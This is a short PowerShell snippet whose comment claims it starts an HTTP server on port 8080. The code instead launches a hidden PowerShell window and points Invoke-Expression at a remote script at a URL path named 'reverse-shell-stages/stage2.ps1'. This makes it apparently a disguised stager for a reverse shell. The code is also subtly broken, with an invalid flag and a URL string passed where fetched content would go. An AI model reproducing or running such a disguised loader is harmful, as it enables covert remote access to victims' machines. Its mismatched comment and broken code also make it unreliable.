```powershell
# Start an HTTP server on port 8080.
Start-Process -WindowStyle Hidden -NoNewWindow powershell.exe -ArgumentList "-noj -noprofile -Command `\"$url =
'https://submerse.github.io/blog/reverse-shell-stages/stage2.ps1'; Invoke-Expression $url;\""
```
